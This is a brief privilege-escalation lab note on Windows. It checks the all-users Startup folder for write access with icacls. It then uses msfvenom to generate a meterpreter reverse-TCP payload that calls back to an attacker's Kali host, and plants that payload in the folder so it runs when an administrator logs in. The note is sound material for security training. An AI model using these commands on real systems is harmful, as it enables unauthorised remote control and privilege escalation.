# Startup Applications

## Startup Applications

## IDEA

in Windows we can a private folder call `Startup` any program or execution file in this folder it will be run automatically when any user loged in which we can found a startup folder for each user and once for generic users

**In this scenario we will focus on generic folder:**`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`

***

## Detection

```powershell
 icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 
 #  icacls.exe -> use to show or edit privilege
```

We will notice that the `“BUILTIN\Users”` group has full access ‘(F)’ to the directory

***

## Exploit

create a reverse shell

```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe
```

then move it to `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`

open meterpreter session and logoff then login with admin account
